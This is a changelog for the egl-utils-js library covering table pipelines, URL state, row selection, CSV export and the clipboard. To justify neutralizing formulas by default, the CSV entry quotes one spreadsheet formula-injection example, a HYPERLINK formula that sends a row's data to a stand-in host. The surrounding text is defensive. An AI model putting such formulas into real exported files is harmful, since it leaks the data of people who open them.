# Changelog

## 1.2.0

### Minor Changes

- daec123: **CSV export and the clipboard** (ROADMAP 19.4, spec 06 F96–F97,
  [ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).

  - **`tableCsv(rows, {columns, …})`** on `egl-utils-js/table` — RFC 4180, zero-dependency, pure
    and SSR-safe: quoting only where the grammar requires it, doubled quotes inside quoted
    fields, CRLF by default and LF as an option, a configurable delimiter. It exports the rows
    you pass, so the current page, the whole source or the selection are all just a different
    argument.
  - **`copyToClipboard(text, {window})`** on `egl-utils-js/dom` — a clipboard write whose every
    refusal is typed.
  - **`ClipboardError`** (`EGL_CLIPBOARD`) on `egl-utils-js/errors` and the root, carrying
    `reason: 'unsupported' | 'insecure' | 'denied' | 'failed'`.

  **A CSV is not an inert document, and the default reflects that.** Every mainstream spreadsheet
  evaluates a cell whose text begins `=`, `+`, `-` or `@`, so a field reading
  `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row beside it the moment the file is
  opened. Those prefixes are **neutralized by default** — with one exception that keeps the
  mitigation liveable: **a field whose whole text is a number is left alone**, because prefixing
  every negative number would corrupt whole columns to buy nothing. `neutralizeFormulas: false`
  turns it off for callers who know their consumer is a parser and not a spreadsheet.

  **A copy that did nothing must not look like one that worked.** The clipboard is
  permission-gated and secure-context-only, so `copyToClipboard` distinguishes an HTTP page
  (`'insecure'`, fixable) from a refused permission (`'denied'`, the user's to grant) from an
  engine without the API (`'unsupported'`). There is deliberately **no `execCommand`
  fallback** — it is deprecated, silently unreliable, and would restore the ambiguity this
  removes.

  Excel stays out of core (NFR-06): `tableCsv` is the extension point, and the same rows go to
  any workbook writer you choose.

- 55f1db6: **`remotePipeline` — table data from a server** (ROADMAP 19.1, spec 06 F88–F91,
  [ADR-0062](docs/adr/0062-a-sibling-not-a-wrapper.md)).

  `tablePipeline` derives a view from rows you already hold. `remotePipeline` holds the same
  question — filters, search, sort, page — and asks a server to answer it.

  ```js
  import { remotePipeline } from 'egl-utils-js/table';

  const table = remotePipeline({
    pageSize: 20,
    load: (query, signal) => api.post('orders/search', { json: query, signal }),
  });
  table.on('change', (view) => render(view.rows, { loading: view.loading, error: view.error }));
  table.setSearch('milan');
  ```

  **Same command vocabulary as `tablePipeline`** — `setFilter`, `setSearch`, `toggleSort`,
  `setSort`, `setPage`, `setPageSize`, `batch`, `on`/`once`/`off`, `view()` — plus `refresh()`
  and `destroy()`. Moving a table from local rows to a server changes where the data comes from
  and nothing your calling code has to relearn.

  **Out-of-order responses cannot show the wrong page.** A superseded load is aborted _and_ its
  result discarded even if it arrives first; an identical query does not re-issue; a failed load
  leaves the previous rows in place with the error reported beside them. The transport is
  injected, never imported, so `/table` still pulls in no `fetch` and still runs on a server.

  Also new: **`tableQuery`**, the pure serializer behind it — the pipeline's state as a plain,
  JSON-safe, transport-neutral object, stable enough to use as a cache key.

  Purely additive: `tablePipeline` is untouched, and a consumer who does not import
  `remotePipeline` pays none of its bytes.

- a0353b7: **Row selection** (ROADMAP 19.3, spec 06 F94–F95,
  [ADR-0065](docs/adr/0065-a-set-of-keys-and-the-page-it-can-see.md)).

  - **`tableSelection({rowKey, mode, initial})`** on `egl-utils-js/table` — a selection held as a
    **set of row keys**, never as a flag on a row, an index, or an object reference: keys survive
    a re-sort, a re-page and a server round-trip, which is also what makes the memory cost
    O(selected) rather than O(source). `rowKey` is required, because keying by index or identity
    is the thing that breaks silently. Pure and Node-safe: it imports no pipeline and knows
    nothing about filters, so the same selection serves `tablePipeline`, `remotePipeline`, or
    neither.
  - **`bsTable({ selection: true })`** — an opt-in leading column: checkboxes (or radios in
    `'single'` mode), a select-all header with a real **indeterminate** state, keyboard
    operability from the native control, an accessible name per row that is the row's key rather
    than "checkbox", and `data-egl-selected` plus `.table-active` on each selected row so CSS can
    style it **without the caller re-rendering**. `instance.selection` exposes the model.

  **Select-all means the current page, and only the current page.** Never "everything matching
  the filter" and never "everything in the source" — both are guesses about intent that have
  shipped as data-loss bugs. `selection.stats(rows)` reports `offPage`: how many selected rows
  are _not_ among the rows passed, which under an active filter includes rows the filter excludes.
  That is the number an "apply to selection" confirmation owes the user, and it is readable at any
  moment rather than something the caller has to track.

  **Rows that leave the source are kept, not pruned.** A selection is the user's intent; filtering
  or reloading changes what is on screen and must not change what they asked to act on. `prune()`
  is the named opt-out for the caller who genuinely wants the other policy.

  Also: `'single'` mode **refuses** `selectAll()` rather than picking a row for you, a re-select of
  an already-selected row emits nothing, and the `'change'` event carries `{keys, added, removed}`
  so a renderer can update what changed instead of everything.

- 87bf810: **Table state in the URL** (ROADMAP 19.2, spec 06 F92–F93,
  [ADR-0063](docs/adr/0063-the-url-is-the-state-and-the-page-goes-last.md)).

  A table's state is the question a user asked — which filters, which search, which sort, which
  page — and a URL is the only part of a page they can bookmark, reload, or send to a colleague.

  Three additions, no change to anything that already existed:

  - **`tableStateToParams(state, {prefix, base})`** and **`tableStateFromParams(input, {prefix})`**
    on `egl-utils-js/table` — pure, SSR-safe, and reaching no platform API but `URLSearchParams`,
    so a server render restores the state from the request's query string and derives page 3
    before any script runs. A `view()` is accepted directly, because it is a superset of the
    state. Parameters the state does not own are **preserved**; defaults are **omitted**, so a
    table at rest has a clean URL.
  - **`bindTableHistory(pipeline, options)`** on `egl-utils-js/dom` — restores from the URL on
    bind, writes on every change, restores again on `popstate`, so Back and Forward move through
    table states. `prefix` lets two tables share one URL; `mode: 'replace'` keeps the state
    addressable without leaving a trail. Works with `remotePipeline` too, where a four-part
    restore is **one** request rather than four.
  - **`TableView` gains `pageSize`** — the read model could already be asked for `pageCount`,
    which is derived from a page size the caller could not read back.

  **Nothing throws on a URL.** `?page=abc` is page 1, `size=0` is unpaginated, a malformed sort
  entry is dropped while the ones around it survive, and a parameter naming a column that no
  longer exists is skipped and then removed from the URL rather than taking the page down. A
  hand-edited link is untrusted input.

  **Fixed** ([BUG-0004](docs/bugs/2026/08/BUG-0004-view-filters-lose-a-proto-column.md)): a
  column keyed `__proto__` was filtered for real by `tablePipeline` and reported by `view()` as
  no filter at all, because the read model was built by assignment. Found by the new
  round-trip property suite, whose key generator produces the key no example test would have.

All notable changes to `egl-utils-js` are documented here, following
[Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/) and
[Semantic Versioning 2.0.0](https://semver.org/).

Every PR that introduces a user-visible change adds a line to `[Unreleased]` in the same
PR. A release PR moves the `[Unreleased]` entries into a new per-version file under
`docs/changelog/v<MAJOR>/v<X.Y.Z>.md` and adds an index row below.

## [Unreleased]

### Added

- **`remotePipeline` and `tableQuery` on `egl-utils-js/table`** — a table pipeline whose rows
  come from a server, sharing `tablePipeline`'s command vocabulary so moving a table from
  local to remote data changes where the rows come from and nothing the calling code has to
  relearn. A superseded load is aborted _and_ its result discarded even if it arrives first,
  an identical query does not re-issue (`refresh()` asks again on purpose), and a failed load
  leaves the previous rows in place with the error beside them. The transport is injected,
  never imported, so `/table` still pulls in no `fetch` (spec 06 F88–F91, ROADMAP 19.1,
  [ADR-0062](docs/adr/0062-a-sibling-not-a-wrapper.md)).
- **`tableStateToParams` and `tableStateFromParams` on `egl-utils-js/table`** — a table state
  and a query string, converted both ways, exactly. Pure and SSR-safe: a server render restores
  the state from the request's query string and derives the right page before any script runs.
  Parameters the state does not own are preserved, defaults are omitted so a table at rest has
  a clean URL, and nothing throws on the input — `page=abc` is page 1, and a malformed sort
  entry is dropped while the ones around it survive (spec 06 F92, ROADMAP 19.2,
  [ADR-0063](docs/adr/0063-the-url-is-the-state-and-the-page-goes-last.md)).
- **`bindTableHistory` on `egl-utils-js/dom`** — keeps a pipeline and the address bar in step:
  restores on bind, writes on change, restores again on `popstate`, so Back and Forward move
  through table states. `prefix` lets two tables share one URL, `mode: 'replace'` keeps the
  state shareable without leaving a trail, and a restore is one transaction — which for
  `remotePipeline` means one request rather than four (spec 06 F93, ROADMAP 19.2, ADR-0063).
- **`pageSize` on the `tablePipeline` read model** — `view()` already reported `pageCount`,
  which is derived from a page size the caller could not read back. Additive; the remote
  sibling's view has carried it since 19.1 (ADR-0063).
- **`tableSelection` on `egl-utils-js/table`** — a row selection held as a set of **row keys**,
  so it survives a re-sort, a re-page and a server round-trip, and costs O(selected) memory
  rather than O(source). `rowKey` is required: keying by index or identity is what breaks
  silently. Select-all means **the rows you hand it** — the current page of a derived view —
  and `stats(rows)` reports `offPage`, the count of selected rows that are not among them,
  which under an active filter includes the ones the filter hides. Rows leaving the source are
  **kept**, with `prune()` as the named opt-out (spec 06 F94, ROADMAP 19.3,
  [ADR-0065](docs/adr/0065-a-set-of-keys-and-the-page-it-can-see.md)).
- **`bsTable({ selection })`** — an opt-in selection column over that model: checkboxes or
  radios, a select-all header with a real **indeterminate** state, keyboard operability, an
  accessible name per row that is the row's key rather than "checkbox", and
  `data-egl-selected` plus `.table-active` on each selected row so CSS can style it without the
  caller re-rendering. `instance.selection` exposes the model (spec 06 F95, ROADMAP 19.3,
  ADR-0065).
- **`tableCsv` on `egl-utils-js/table`** — RFC 4180 CSV from the rows you pass, zero-dependency
  and SSR-safe: quoting only where the grammar requires it, CRLF by default with LF as an
  option, a configurable delimiter. **Formula injection is neutralized by default**, because a
  cell beginning `=`, `+`, `-` or `@` is executable in every mainstream spreadsheet — with the
  one exception that keeps the mitigation liveable, a field whose whole text is a number.
  `neutralizeFormulas: false` for callers whose consumer is a parser (spec 06 F96, ROADMAP 19.4,
  [ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).
- **`copyToClipboard` on `egl-utils-js/dom`**, and **`ClipboardError`** (`EGL_CLIPBOARD`) on
  `egl-utils-js/errors` and the root — a clipboard write whose every refusal is typed and
  classified: `'insecure'` (serve over HTTPS), `'denied'` (the user's to grant),
  `'unsupported'`, `'failed'`. No `execCommand` fallback, deliberately: a copy button that
  quietly did nothing looks exactly like one that worked (spec 06 F97, ROADMAP 19.4,
  ADR-0066).

### Changed

### Deprecated

### Removed

### Fixed

- **A column keyed `__proto__` is now reported by `view()`** instead of vanishing from it.
  `tablePipeline` accepted `setFilter('__proto__', …)` and applied the filter for real, but
  built its `filters` read model by assignment — which routes through `Object.prototype`'s
  `__proto__` setter, so no own property was ever created and the view reported no filter on a
  column that was being filtered. Every consumer of `view().filters` was affected, including
  the new URL serialization. Found by the F92 round-trip property suite, whose key generator
  produces the key nobody would have chosen to test
  ([BUG-0004](docs/bugs/2026/08/BUG-0004-view-filters-lose-a-proto-column.md), ROADMAP 19.2).

### Security

---

## Released versions

| Version | Date       | Changelog                                                  |
| ------- | ---------- | ---------------------------------------------------------- |
| v1.1.0  | 2026-08-21 | [docs/changelog/v1/v1.1.0.md](docs/changelog/v1/v1.1.0.md) |
| v1.0.0  | 2026-08-13 | [docs/changelog/v1/v1.0.0.md](docs/changelog/v1/v1.0.0.md) |
| v0.9.0  | 2026-08-09 | [docs/changelog/v0/v0.9.0.md](docs/changelog/v0/v0.9.0.md) |
| v0.8.0  | 2026-08-09 | [docs/changelog/v0/v0.8.0.md](docs/changelog/v0/v0.8.0.md) |
| v0.7.0  | 2026-08-08 | [docs/changelog/v0/v0.7.0.md](docs/changelog/v0/v0.7.0.md) |
| v0.6.0  | 2026-08-07 | [docs/changelog/v0/v0.6.0.md](docs/changelog/v0/v0.6.0.md) |
| v0.5.0  | 2026-08-07 | [docs/changelog/v0/v0.5.0.md](docs/changelog/v0/v0.5.0.md) |
| v0.4.0  | 2026-08-06 | [docs/changelog/v0/v0.4.0.md](docs/changelog/v0/v0.4.0.md) |
| v0.3.0  | 2026-08-06 | [docs/changelog/v0/v0.3.0.md](docs/changelog/v0/v0.3.0.md) |
| v0.2.0  | 2026-08-06 | [docs/changelog/v0/v0.2.0.md](docs/changelog/v0/v0.2.0.md) |
| v0.1.0  | 2026-08-03 | [docs/changelog/v0/v0.1.0.md](docs/changelog/v0/v0.1.0.md) |
